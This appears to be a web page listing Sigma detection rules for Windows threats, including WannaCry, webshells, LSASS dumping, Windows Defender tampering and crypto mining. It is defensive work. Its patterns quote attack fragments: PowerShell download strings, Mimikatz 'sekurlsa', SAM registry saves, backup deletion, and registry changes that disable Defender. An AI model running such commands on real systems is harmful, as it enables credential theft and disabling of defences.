<li><a href="#">title:Vulnerable Dell BIOS Update Driver Load id: 21b23707-60d6-41bb-96e3-0f0481b0fed9 description: Detects the load of the vulnerable Dell BIOS update driver as reported in CVE-2021-21551 status: experimental author: Florian Roth date: 2021/05/05 references: - logsource: category: driver_load product: windows tags: - attack.privilege_escalation - cve.2021.21551 - attack.t1543 detection: selection_image: ImageLoaded|contains: '\DBUtil_2_3.Sys' selection_hash: Hashes|contains: - '0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5' - 'c948ae14761095e4d76b55d9de86412258be7afd' - 'c996d7971c49252c582171d9380360f2' - 'ddbf5ecca5c8086afde1fb4f551e9e6400e94f4428fe7fb5559da5cffa654cc1' - '10b30bdee43b3a2ec4aa63375577ade650269d25' - 'd2fd132ab7bbc6bbb87a84f026fa0244' condition: selection_image or selection_hash falsepositives: - Legitimate BIOS driver updates (should be rare) level: high 
<li><a href="#">title:Vulnerable Netlogon Secure Channel Connection Allowed id: a0cb7110-edf0-47a4-9177-541a4083128a status: experimental description: Detects that a vulnerable Netlogon secure channel connection was allowed, which could be an indicator of CVE-2020-1472. references: - author: NVISO date: 2020/09/15 modified: 2021/11/30 tags: - attack.privilege_escalation - attack.t1548 logsource: product: windows service: system detection: selection: Provider_Name: NetLogon # Active Directory: NetLogon ETW GUID {F33959B4-DBEC-11D2-895B-00C04F79AB69} EventID: 5829 condition: selection fields: - SAMAccountName falsepositives: - Unknown level: high 
<li><a href="#">title:Wannacry Killswitch Domain id: 3eaf6218-3bed-4d8a-8707-274096f12a18 status: test description: Detects wannacry killswitch domain dns queries author: Mike Wade references: - date: 2020/09/16 modified: 2022/03/24 logsource: category: dns detection: selection: query: - 'ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.testing' - 'ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.test' - 'ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com' - 'ayylmaotjhsstasdfasdfasdfasdfasdfasdfasdf.com' - 'iuqssfsodp9ifjaposdfjhgosurijfaewrwergwea.com' condition: selection falsepositives: - Analyst testing level: high tags: - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:WannaCry Ransomware id: 41d40bff-377a-43e2-8e1b-2e543069e079 status: test description: Detects WannaCry ransomware activity author: Florian Roth (rule), Tom U. @c_APT_ure (collection), oscd.community, Jonhnathan Ribeiro references: - date: 2019/01/16 modified: 2022/02/24 logsource: category: process_creation product: windows detection: selection1: - Image|endswith: - '\tasksche.exe' - '\mssecsvc.exe' - '\taskdl.exe' - '\taskhsvc.exe' - '\taskse.exe' - '\111.exe' - '\lhdfrgui.exe' # - '\diskpart.exe' # cannot be used in a rule of level critical - '\linuxnew.exe' - '\wannacry.exe' - Image|contains: 'WanaDecryptor' selection2: - CommandLine|contains|all: - 'icacls' - '/grant' - 'Everyone:F' - '/T' - '/C' - '/Q' - CommandLine|contains|all: - 'bcdedit' - '/set' - '{default}' - 'recoveryenabled' - 'no' - CommandLine|contains|all: - 'wbadmin' - 'delete' - 'catalog' - '-quiet' - CommandLine|contains: '@Please_Read_Me@.txt' condition: 1 of selection* fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: critical tags: - attack.lateral_movement - attack.t1210 - attack.discovery - attack.t1083 - attack.defense_evasion - attack.t1222.001 - attack.impact - attack.t1486 - attack.t1490 
<li><a href="#">title:Wbadmin Delete Systemstatebackup id: 89f75308-5b1b-4390-b2d8-d6b2340efaf8 status: test description: | Deletes the Windows systemstatebackup using wbadmin.exe. This technique is used by numerous ransomware families. This may only be successful on server platforms that have Windows Backup enabled. references: - author: frack113 date: 2021/12/13 modified: 2022/02/28 logsource: category: process_creation product: windows detection: wbadmin_exe: - Image|endswith: \wbadmin.exe - CommandLine|contains: wbadmin wbadmin_cmd: CommandLine|contains|all: - 'delete ' - 'systemstatebackup ' - '-keepVersions:0' condition: all of wbadmin_* falsepositives: - Unknown level: high tags: - attack.impact - attack.t1490 
<li><a href="#">title:WCE wceaux.dll Access id: 1de68c67-af5c-4097-9c85-fe5578e09e67 status: test description: Detects wceaux.dll access while WCE pass-the-hash remote command execution on source host author: Thomas Patzke references: - - date: 2017/06/14 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: - 4656 - 4658 - 4660 - 4663 ObjectName|endswith: '\wceaux.dll' condition: selection falsepositives: - Unknown level: critical tags: - attack.credential_access - attack.t1003 - attack.s0005 
<li><a href="#">title:Wdigest CredGuard Registry Modification id: 1a2d6c47-75b0-45bd-b133-2c0be75349fd status: test description: Detects potential malicious modification of the property value of IsCredGuardEnabled from HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest to disable Cred Guard on a system. This is usually used with UseLogonCredential to manipulate the caching credentials. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - date: 2019/08/25 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: TargetObject|endswith: '\IsCredGuardEnabled' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Wdigest Enable UseLogonCredential id: d6a9b252-c666-4de6-8806-5561bbbd3bdc description: Detects potential malicious modification of the property value of UseLogonCredential from HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest to enable clear-text credentials status: experimental date: 2019/09/12 modified: 2022/03/26 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|endswith: 'WDigest\UseLogonCredential' Details: DWORD (0x00000001) condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Weak Encryption Enabled and Kerberoast id: f6de9536-0441-4b3f-a646-f4e00f300ffd status: test description: Detects scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking. author: '@neu5ron' references: - - date: 2017/07/30 modified: 2021/11/27 logsource: product: windows service: security definition: 'Requirements: Audit Policy : Account Management > Audit User Account Management, Group Policy : Computer Configuration\Windows Settings\Security Settings\Advanced Audit Policy Configuration\Audit Policies\Account Management\Audit User Account Management' detection: selection: EventID: 4738 # According to Microsoft, the bit values are listed here: # However, that seems to be a simple copy from # and the actual flags that are used are quite different and, unfortunately, not documented. # contains a number of EVTX files with relevant events, which can be used to extract # the following values. olduac_des: # 0x8000 OldUacValue|endswith: - 8??? - 9??? - A??? - B??? - C??? - D??? - E??? - F??? newuac_des: NewUacValue|endswith: - 8??? - 9??? - A??? - B??? - C??? - D??? - E??? - F??? olduac_preauth: # 0x10000 OldUacValue|endswith: - 1???? - 3???? - 5???? - 7???? - 9???? - B???? - D???? - F???? newuac_preauth: NewUacValue|endswith: - 1???? - 3???? - 5???? - 7???? - 9???? - B???? - D???? - F???? olduac_encrypted: # 0x800 OldUacValue|endswith: - 8?? - 9?? - A?? - B?? - C?? - D?? - E?? - F?? newuac_encrypted: NewUacValue|endswith: - 8?? - 9?? - A?? - B?? - C?? - D?? - E?? - F?? condition: selection and ((newuac_des and not olduac_des) or (newuac_preauth and not olduac_preauth) or (newuac_encrypted and not olduac_encrypted)) falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:WebDav Put Request id: 705072a5-bb6f-4ced-95b6-ecfa6602090b status: test description: A General detection for WebDav user-agent being used to PUT files on a WebDav network share. This could be an indicator of exfiltration. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - date: 2020/05/02 modified: 2021/11/27 logsource: product: zeek service: http detection: selection: user_agent|contains: 'WebDAV' method: 'PUT' filter: id.resp_h: - 192.168.0.0/16 - 172.16.0.0/12 - 10.0.0.0/8 condition: selection and not filter falsepositives: - Unknown level: low tags: - attack.exfiltration - attack.t1048.003 
<li><a href="#">title:Webshell Detection With Command Line Keywords id: bed2a484-9348-4143-8a8a-b801c979301c description: Detects certain command line parameters often used during reconnaissance activity via web shells author: Florian Roth, Jonhnathan Ribeiro, Anton Kutepov, oscd.community status: experimental references: - - date: 2017/01/01 modified: 2022/05/13 tags: - attack.persistence - attack.t1505.003 - attack.t1018 - attack.t1033 - attack.t1087 logsource: category: process_creation product: windows detection: selection_webserver_image: ParentImage|endswith: - '\w3wp.exe' - '\php-cgi.exe' - '\nginx.exe' - '\httpd.exe' - '\caddy.exe' - '\ws_tomcatservice.exe' selection_webserver_characteristics_tomcat1: ParentImage|endswith: - '\java.exe' - '\javaw.exe' ParentImage|contains: - '-tomcat-' - '\tomcat' selection_webserver_characteristics_tomcat2: ParentImage|endswith: - '\java.exe' - '\javaw.exe' CommandLine|contains: - 'catalina.jar' - 'CATALINA_HOME' susp_net_utility: OriginalFileName: - 'net.exe' - 'net1.exe' CommandLine|contains: - ' user ' - ' use ' - ' group ' susp_ping_utility: OriginalFileName: 'ping.exe' CommandLine|contains: ' -n ' susp_change_dir: CommandLine|contains: - '&cd&echo' # china chopper web shell - 'cd /d ' # susp_wmic_utility: OriginalFileName: 'wmic.exe' CommandLine|contains: ' /node:' susp_misc_discovery_binaries: - Image|endswith: - '\whoami.exe' - '\systeminfo.exe' - '\quser.exe' - '\ipconfig.exe' - '\pathping.exe' - '\tracert.exe' - '\netstat.exe' - '\schtasks.exe' - '\vssadmin.exe' - '\wevtutil.exe' - '\tasklist.exe' - OriginalFileName: - 'whoami.exe' - 'sysinfo.exe' - 'quser.exe' - 'ipconfig.exe' - 'pathping.exe' - 'tracert.exe' - 'netstat.exe' - 'schtasks.exe' - 'VSSADMIN.EXE' - 'wevtutil.exe' - 'tasklist.exe' susp_misc_discovery_commands: CommandLine|contains: - ' Test-NetConnection ' - 'dir \' # remote dir: dir \<redacted IP #3>\C$:\windows\temp\*.exe condition: 1 of selection* and 1 of susp* fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Webshell Hacking Activity Patterns id: 4ebc877f-4612-45cb-b3a5-8e3834db36c9 description: Detects certain parent child patterns found in cases in which a webshell is used to perform certain credential dumping or exfiltration activities on a compromised system author: Florian Roth status: experimental references: - date: 2022/03/17 tags: - attack.persistence - attack.t1505.003 - attack.t1018 - attack.t1033 - attack.t1087 logsource: category: process_creation product: windows detection: # Webserver selection_webserver_image: ParentImage|endswith: - '\w3wp.exe' - '\php-cgi.exe' - '\nginx.exe' - '\httpd.exe' - '\caddy.exe' - '\ws_tomcatservice.exe' selection_webserver_characteristics_tomcat1: ParentImage|endswith: - '\java.exe' - '\javaw.exe' ParentImage|contains: - '-tomcat-' - '\tomcat' selection_webserver_characteristics_tomcat2: ParentImage|endswith: - '\java.exe' - '\javaw.exe' CommandLine|contains: - 'catalina.jar' - 'CATALINA_HOME' # Suspicious child processes selection_child_1: # Process dumping CommandLine|contains|all: - 'rundll32' - 'comsvcs.dll' selection_child_2: # Winrar exfil CommandLine|contains|all: - ' -hp' - ' a ' - ' -m' selection_child_3: # User add CommandLine|contains|all: - 'net' - ' user ' - ' /add' selection_child_4: CommandLine|contains|all: - 'net' - ' localgroup ' - ' administrators ' - '/add' selection_child_5: Image|endswith: # Credential stealing - '\ntdsutil.exe' # AD recon - '\ldifde.exe' - '\adfind.exe' # Process dumping - '\procdump.exe' - '\Nanodump.exe' # Destruction / ransom groups - '\vssadmin.exe' - '\fsutil.exe' selection_child_6: # SUspicious patterns CommandLine|contains: - ' -NoP ' # Often used in malicious PowerShell commands - ' -W Hidden ' # Often used in malicious PowerShell commands - ' -decode ' # Used with certutil - ' /decode ' # Used with certutil - 'reg save ' # save registry SAM - syskey extraction - '.downloadstring(' # PowerShell download command - '.downloadfile(' # PowerShell download command - 'FromBase64String' # PowerShell encoded payload - ' /ticket:' # Rubeus - ' sekurlsa' # Mimikatz - '.dmp full' # Process dumping method apart from procdump - 'process call create' # WMIC process creation - 'whoami /priv' condition: 1 of selection_webserver* and 1 of selection_child* falsepositives: - Unlikely level: high 
<li><a href="#">title:Webshell Recon Detection Via CommandLine & Processes id: f64e5c19-879c-4bae-b471-6d84c8339677 status: test description: Looking for processes spawned by web server components that indicate reconnaissance by popular public domain webshells for whether perl, python or wget are installed. author: Cian Heasley, Florian Roth references: - date: 2020/07/22 modified: 2022/03/17 tags: - attack.persistence - attack.t1505.003 logsource: category: process_creation product: windows detection: selection_webserver_image: ParentImage|endswith: - '\w3wp.exe' - '\php-cgi.exe' - '\nginx.exe' - '\httpd.exe' - '\caddy.exe' - '\ws_tomcatservice.exe' selection_webserver_characteristics_tomcat1: ParentImage|endswith: - '\java.exe' - '\javaw.exe' ParentImage|contains: - '-tomcat-' - '\tomcat' selection_webserver_characteristics_tomcat2: ParentImage|endswith: - '\java.exe' - '\javaw.exe' CommandLine|contains: - 'catalina.jar' - 'CATALINA_HOME' recon: CommandLine|contains: - 'perl --help' - 'python --help' - 'wget --help' - 'perl -h' condition: 1 of selection* and recon fields: - Image - CommandLine - ParentCommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Webshell ReGeorg Detection Via Web Logs id: 2ea44a60-cfda-11ea-87d0-0242ac130003 status: experimental description: Certain strings in the uri_query field when combined with null referer and null user agent can indicate activity associated with the webshell ReGeorg. author: Cian Heasley date: 2020/08/04 modified: 2021/11/23 references: - - logsource: category: webserver detection: selection: cs-uri-query|contains: - 'cmd=read' - 'connect&target' - 'cmd=connect' - 'cmd=disconnect' - 'cmd=forward' filter: cs-referer: null cs-User-Agent: null cs-method: POST condition: selection and filter fields: - cs-uri-query - cs-referer - cs-method - cs-User-Agent falsepositives: - Web applications that use the same URL parameters as ReGeorg level: high tags: - attack.persistence - attack.t1505.003 
<li><a href="#">title:Webshell Remote Command Execution id: c0d3734d-330f-4a03-aae2-65dacc6a8222 status: experimental description: Detects possible command execution by web application/web shell author: Ilyas Ochkov, Beyu Denis, oscd.community date: 2019/10/12 modified: 2021/11/11 references: - personal experience logsource: product: linux service: auditd detection: selection: type: 'SYSCALL' syscall: 'execve' key: 'detect_execve_www' condition: selection falsepositives: - Admin activity - Crazy web applications level: critical tags: - attack.persistence - attack.t1505.003 
<li><a href="#">title:WerFault Accassing LSASS id: e5b33f7d-eb93-48b6-9851-09e1e610b6d7 status: experimental description: Detects process LSASS memory dump using Mimikatz, NanoDump, Invoke-Mimikatz, Procdump or Taskmgr based on the CallTrace pointing to ntdll.dll, dbghelp.dll or dbgcore.dll for win10, server2016 and up. author: Florian Roth date: 2012/06/27 references: - tags: - attack.credential_access - attack.t1003.001 - attack.s0002 logsource: category: process_access product: windows detection: selection: SourceImage|endswith: '\WerFault.exe' TargetImage|endswith: '\lsass.exe' GrantedAccess: '0x1FFFFF' condition: selection falsepositives: - Actual failures in lsass.exe that trigger a crash dump (unlikely) - Unknown cases in which WerFault accesses lsass.exe level: high 
<li><a href="#">title:WerFault LSASS Process Memory Dump id: c3e76af5-4ce0-4a14-9c9a-25ceb8fda182 description: Detects WerFault creating a dump file with a name that indicates that the dump file could be an LSASS process memory, which contains user credentials status: experimental author: Florian Roth references: - date: 2022/06/27 tags: - attack.credential_access - attack.t1003.001 logsource: product: windows category: file_event detection: selection: Image: C:\WINDOWS\system32\WerFault.exe TargetFilename|contains: - '\lsass' - 'lsass.exe' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:WhoAmI as Parameter id: e9142d84-fbe0-401d-ac50-3e519fb00c89 status: experimental author: Florian Roth date: 2021/11/29 description: Detects a suspicious process command line that uses whoami as first parameter (as e.g. used by EfsPotato) references: - tags: - attack.discovery - attack.t1033 - car.2016-03-001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: '.exe whoami' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Whoami Execution Anomaly id: 8de1cbe8-d6f5-496d-8237-5f44a721c7a0 status: experimental description: Detects the execution of whoami with suspicious parents or parameters references: - - author: Florian Roth date: 2021/08/12 modified: 2022/05/13 tags: - attack.discovery - attack.t1033 - car.2016-03-001 logsource: category: process_creation product: windows detection: selection: - Image|endswith: '\whoami.exe' - OriginalFileName: 'whoami.exe' filter1: ParentImage|endswith: - '\cmd.exe' - '\powershell.exe' filter2: ParentImage: - 'C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe' - '' filter3: ParentImage: null selection_special: CommandLine|contains: - 'whoami -all' - 'whoami /all' - 'whoami.exe -all' - 'whoami.exe /all' condition: ( selection and not filter1 and not filter2 and not filter3 ) or selection_special falsepositives: - Admin activity - Scripts and administrative tools used in the monitored environment - Monitoring activity level: high 
<li><a href="#">title:Whoami Execution id: e28a5a99-da44-436d-b7a0-2afc20a5f413 status: test description: Detects the execution of whoami, which is often used by attackers after exploitation / privilege escalation but rarely used by administrators author: Florian Roth references: - - date: 2018/08/13 modified: 2022/05/13 logsource: category: process_creation product: windows detection: selection: - Image|endswith: '\whoami.exe' - OriginalFileName: 'whoami.exe' condition: selection falsepositives: - Admin activity - Scripts and administrative tools used in the monitored environment - Monitoring activity level: medium tags: - attack.discovery - attack.t1033 - car.2016-03-001 
<li><a href="#">title:WinDivert Driver Load id: 679085d5-f427-4484-9f58-1dc30a7c426d status: experimental description: Detects the load of the Windiver driver, a powerful user-mode capture/sniffing/modification/blocking/re-injection package for Windows author: Florian Roth date: 2021/07/30 references: - - tags: - attack.collection - attack.defense_evasion - attack.t1599.001 - attack.t1557.001 logsource: category: driver_load product: windows detection: selection: ImageLoaded|contains: - '\WinDivert.sys' - '\WinDivert64.sys' condition: selection falsepositives: - Legitimate WinDivert driver usage level: high 
<li><a href="#">title:Windows 10 Scheduled Task SandboxEscaper 0-day id: 931b6802-d6a6-4267-9ffa-526f57f22aaf status: test description: Detects Task Scheduler .job import arbitrary DACL write\par author: Olaf Hartong references: - date: 2019/05/22 modified: 2022/05/13 logsource: category: process_creation product: windows detection: selection_img: Image|endswith: '\schtasks.exe' OriginalFileName: 'schtasks.exe' selection_cli: CommandLine|contains|all: - '/change' - '/TN' - '/RU' - '/RP' condition: all of selection* falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1053.005 - car.2013-08-001 
<li><a href="#">title:Windows Cmd Delete File id: 379fa130-190e-4c3f-b7bc-6c8e834485f3 status: experimental description: | Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint. author: frack113 date: 2022/01/15 references: - logsource: category: process_creation product: windows detection: selection: - CommandLine|contains|all: - 'del ' - /f - CommandLine|contains|all: - rmdir - /s - /q condition: selection falsepositives: - Legitimate script level: low tags: - attack.defense_evasion - attack.t1070.004 
<li><a href="#">title:Windows Credential Editor id: 7aa7009a-28b9-4344-8c1f-159489a390df description: Detects the use of Windows Credential Editor (WCE) status: experimental author: Florian Roth references: - date: 2019/12/31 modified: 2022/03/04 tags: - attack.credential_access - attack.t1003.001 - attack.s0005 logsource: category: process_creation product: windows detection: selection1: - Imphash: - a53a02b997935fd8eedcb5f7abab9b9f - e96a73c7bf33a464c510ede582318bf2 - Hashes|contains: # Sysmon field hashes contains all types - IMPHASH=a53a02b997935fd8eedcb5f7abab9b9f - IMPHASH=e96a73c7bf33a464c510ede582318bf2 selection2: CommandLine|endswith: '.exe -S' ParentImage|endswith: '\services.exe' filter: Image|endswith: '\clussvc.exe' condition: ( selection1 or selection2 ) and not filter falsepositives: - Another service that uses a single -s command line switch level: critical 
<li><a href="#">title:Windows Credential Editor Registry id: a6b33c02-8305-488f-8585-03cb2a7763f2 status: test description: Detects the use of Windows Credential Editor (WCE) author: Florian Roth references: - date: 2019/12/31 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: TargetObject|contains: Services\WCESERVICE\Start condition: selection falsepositives: - Unknown level: critical tags: - attack.credential_access - attack.t1003.001 - attack.s0005 
<li><a href="#">title:Windows Credential Manager Access via VaultCmd id: 58f50261-c53b-4c88-bd12-1d71f12eda4c status: experimental description: List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe author: frack113 date: 2022/04/08 modified: 2022/05/13 references: - logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\VaultCmd.exe' - OriginalFileName: 'VAULTCMD.EXE' selection_cli: CommandLine|contains: '/listcreds:' condition: all of selection* falsepositives: - Unknown level: medium tags: - attack.credential_access - attack.t1555.004 
<li><a href="#">title:Windows Crypto Mining Indicators id: 66c3b204-9f88-4d0a-a7f7-8a57d521ca55 description: Detects command line parameters or strings often used by crypto miners status: stable references: - author: Florian Roth date: 2021/10/26 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - ' --cpu-priority=' - '--donate-level=0' - ' -o pool.' - ' --nicehash' - ' --algo=rx/0 ' - 'stratum+tcp://' - 'stratum+udp://' # base64 encoded: --donate-level= - 'LS1kb25hdGUtbGV2ZWw9' - '0tZG9uYXRlLWxldmVsP' - 'tLWRvbmF0ZS1sZXZlbD' # base64 encoded: stratum+tcp:// and stratum+udp:// - 'c3RyYXR1bSt0Y3A6Ly' - 'N0cmF0dW0rdGNwOi8v' - 'zdHJhdHVtK3RjcDovL' - 'c3RyYXR1bSt1ZHA6Ly' - 'N0cmF0dW0rdWRwOi8v' - 'zdHJhdHVtK3VkcDovL' condition: selection falsepositives: - Legitimate use of crypto miners level: high tags: - attack.impact - attack.t1496 
<li><a href="#">title:Windows Crypto Mining Pool Connections id: fa5b1358-b040-4403-9868-15f7d9ab6329 status: stable description: Detects process connections to a Monero crypto mining pool references: - date: 2021/10/26 author: Florian Roth logsource: category: network_connection product: windows detection: selection: DestinationHostname: - 'pool.minexmr.com' - 'fr.minexmr.com' - 'de.minexmr.com' - 'sg.minexmr.com' - 'ca.minexmr.com' - 'us-west.minexmr.com' - 'pool.supportxmr.com' - 'mine.c3pool.com' - 'xmr-eu1.nanopool.org' - 'xmr-eu2.nanopool.org' - 'xmr-us-east1.nanopool.org' - 'xmr-us-west1.nanopool.org' - 'xmr-asia1.nanopool.org' - 'xmr-jp1.nanopool.org' - 'xmr-au1.nanopool.org' - 'xmr.2miners.com' - 'xmr.hashcity.org' - 'xmr.f2pool.com' - 'xmrpool.eu' - 'pool.hashvault.pro' - 'moneroocean.stream' - 'monerocean.stream' condition: selection falsepositives: - Legitimate use of crypto miners level: high tags: - attack.impact - attack.t1496 
<li><a href="#">title:Windows Defender AMSI Trigger Detected id: ea9bf0fa-edec-4fb8-8b78-b119f2528186 description: Detects triggering of AMSI by Windows Defender. date: 2020/09/14 modified: 2021/10/13 author: Bhabesh Raj references: - status: stable logsource: product: windows service: windefend detection: selection: EventID: 1116 Source_Name: 'AMSI' condition: selection falsepositives: - Unlikely level: high tags: - attack.execution - attack.t1059 
<li><a href="#">title:Windows Defender Download Activity id: 46123129-1024-423e-9fae-43af4a0fa9a5 status: test description: Detect the use of Windows Defender to download payloads author: Matthew Matchen references: - - date: 2020/09/04 logsource: category: process_creation product: windows detection: selection1: - CommandLine|contains: 'MpCmdRun.exe' - Description: 'Microsoft Malware Protection Command Line Utility' selection2: CommandLine|contains|all: - 'DownloadFile' - 'url' condition: selection1 and selection2 fields: - CommandLine falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1218 - attack.command_and_control - attack.t1105 
<li><a href="#">title:Windows Defender Exclusion Set id: e9c8808f-4cfb-4ba9-97d4-e5f3beaa244d status: test description: 'Detects scenarios where an windows defender exclusion was added in registry where an entity would want to bypass antivirus scanning from windows defender' author: '@BarryShooshooga' references: - date: 2019/10/26 modified: 2021/11/27 logsource: product: windows service: security definition: 'Requirements: Audit Policy : Security Settings/Local Policies/Audit Policy, Registry System Access Control (SACL): Auditing/User' detection: selection: EventID: - 4657 - 4656 - 4660 - 4663 ObjectName|contains: '\Microsoft\Windows Defender\Exclusions\' condition: selection falsepositives: - Intended inclusions by administrator level: high tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Windows Defender Exclusions Added id: 1321dc4e-a1fe-481d-a016-52c45f0c8b4f description: Detects the Setting of Windows Defender Exclusions date: 2021/07/06 modified: 2022/02/02 author: Christian Burkard references: - status: stable tags: - attack.defense_evasion - attack.t1562.001 logsource: product: windows service: windefend detection: selection1: EventID: 5007 NewValue|contains: '\Microsoft\Windows Defender\Exclusions' condition: selection1 falsepositives: - Administrator actions level: medium 
<li><a href="#">title:Windows Defender Exclusions Added id: a982fc9c-6333-4ffb-a51d-addb04e8b529 related: - id: 1321dc4e-a1fe-481d-a016-52c45f0c8b4f type: derived description: Detects the Setting of Windows Defender Exclusions date: 2021/07/06 modified: 2022/03/26 author: Christian Burkard references: - status: test logsource: product: windows category: registry_set detection: selection2: #EventID: 13 EventType: SetValue TargetObject|contains: '\Microsoft\Windows Defender\Exclusions' condition: selection2 falsepositives: - Administrator actions level: medium tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Windows Defender Malware Detection History Deletion id: 2afe6582-e149-11ea-87d0-0242ac130003 status: experimental description: Windows Defender logs when the history of detected infections is deleted. Log file will contain the message "Windows Defender Antivirus has removed history of malware and other potentially unwanted software". author: Cian Heasley references: - date: 2020/08/13 modified: 2021/05/30 tags: - attack.defense_evasion - attack.t1070.001 logsource: product: windows service: windefend detection: selection: EventID: 1013 EventType: 4 condition: selection fields: - EventID - EventType falsepositives: - Deletion of Defender malware detections history for legitimate reasons level: high 
<li><a href="#">title:Windows Defender Real-Time Protection Disabled id: fd115e64-97c7-491f-951c-fc8da7e042fa description: Detects disabling Windows Defender Real-Time Protection by modifying registry date: 2021/10/18 modified: 2022/03/26 author: AlertIQ references: - - status: experimental logsource: product: windows category: registry_set detection: tamper_registry1: EventType: SetValue TargetObject: - 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring' - 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableIOAVProtection' - 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection' - 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring' - 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScanOnRealtimeEnable' - 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet\DisableBlockAtFirstSeen' Details: 'DWORD (0x00000001)' tamper_registry2: EventType: SetValue TargetObject: - 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet\SpynetReporting' - 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet\SubmitSamplesConsent' Details: 'DWORD (0x00000000)' condition: tamper_registry1 or tamper_registry2 falsepositives: - Administrator actions level: high tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Windows Defender Threat Detected id: 57b649ef-ff42-4fb0-8bf6-62da243a1708 description: Detects all actions taken by Windows Defender malware detection engines date: 2020/07/28 author: JÃ¡n TrenÄanskÃ½ references: - status: stable logsource: product: windows service: windefend detection: selection: EventID: - 1006 - 1116 - 1015 - 1117 condition: selection falsepositives: - Unlikely level: high tags: - attack.execution - attack.t1059 
<li><a href="#">title:Windows Defender Threat Detection Disabled - Registry id: a64e4198-c1c8-46a5-bc9c-324c86455fd4 related: - id: fe34868f-6e0e-4882-81f6-c43aa8f15b62 type: derived description: Detects disabling Windows Defender threat protection date: 2020/07/28 modified: 2022/05/04 author: JÃ¡n TrenÄanskÃ½, frack113, AlertIQ references: - - - status: experimental logsource: product: windows category: registry_set detection: tamper_registry: EventType: SetValue TargetObject: - 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware' - 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiVirus' Details: 'DWORD (0x00000001)' selection2: EventType: SetValue TargetObject: - 'HKLM\SYSTEM\CurrentControlSet\Services\WinDefend' - 'HKLM\SOFTWARE\Microsoft\Windows Defender' - 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender' Details: 'DWORD (0x00000001)' condition: tamper_registry or selection2 falsepositives: - Administrator actions level: high tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Windows Defender Threat Detection Disabled - Service id: 6c0a7755-6d31-44fa-80e1-133e57752680 related: - id: fe34868f-6e0e-4882-81f6-c43aa8f15b62 type: derived description: Detects disabling Windows Defender threat protection date: 2020/07/28 modified: 2022/05/04 author: JÃ¡n TrenÄanskÃ½, frack113 references: - - status: stable tags: - attack.defense_evasion - attack.t1562.001 logsource: product: windows service: system detection: selection: EventID: 7036 Provider_Name: 'Service Control Manager' param1: - 'Windows Defender Antivirus Service' - 'Service antivirus Microsoft Defender' #French OS param2: 'stopped' condition: selection falsepositives: - Administrator actions - Auto updates of Windows Defender causes restarts level: low 
<li><a href="#">title:Windows Defender Threat Detection Disabled id: fe34868f-6e0e-4882-81f6-c43aa8f15b62 description: Detects disabling Windows Defender threat protection date: 2020/07/28 modified: 2022/05/06 author: JÃ¡n TrenÄanskÃ½, frack113 references: - - status: stable tags: - attack.defense_evasion - attack.t1562.001 logsource: product: windows service: windefend detection: selection: EventID: - 5001 - 5010 - 5012 - 5101 condition: selection falsepositives: - Administrator actions level: low 
<li><a href="#">title:Windows Firewall Profile Disabled id: 488b44e7-3781-4a71-888d-c95abfacf44d description: Detects when a user disables the Windows Firewall via a Profile to help evade defense. status: experimental author: Austin Songer @austinsonger date: 2021/10/12 modified: 2021/10/16 references: - - - - logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - Set-NetFirewallProfile - -Profile - -Enabled - 'False' condition: selection tags: - attack.defense_evasion - attack.t1562.004 level: high falsepositives: - Unknown 
